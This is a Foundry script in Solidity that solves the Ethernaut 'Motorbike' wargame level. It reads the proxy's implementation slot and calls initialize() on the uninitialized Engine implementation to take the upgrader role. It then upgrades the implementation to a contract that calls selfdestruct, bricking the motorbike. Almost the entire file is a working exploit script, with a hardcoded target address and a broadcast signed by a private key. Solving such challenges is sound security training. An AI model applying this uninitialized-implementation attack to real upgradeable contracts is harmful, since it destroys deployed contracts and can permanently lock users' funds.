// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {Motorbike, Engine} from "src/L25Motorbike.sol";

// 0x8Ba41269ed69496c07bea886c300016A0BA8FB5E

/**
 * @notice Ethernaut's motorbike has a brand new upgradeable engine design.
 *
 * Would you be able to selfdestruct its engine and make the motorbike unusable?
 *
 * Attack method:
 *
 */
contract Attacker {
    function killed() external {
        selfdestruct(address(0));
    }
}

contract L25MotorbikeAttack is Script {
    address constant myAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    Motorbike public motorbike = Motorbike(0x0Ea09D641EbA71C4122cE5A1F209F8d749A3F960);
    Engine engine = Engine(
        address(
            uint160(
                uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        )
    );

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        engine.initialize();
        console.log("New engine upgrader:", engine.upgrader());

        // // Deploy attacker contract
        Attacker attacker = deployAttacker();

        // Upgrade engine to attacker contract
        engine.upgradeToAndCall(address(attacker), abi.encodeWithSelector(Attacker.killed.selector));
        vm.stopBroadcast();
    }

    function deployAttacker() public returns (Attacker) {
        Attacker attacker = new Attacker();
        return attacker;
    }
}
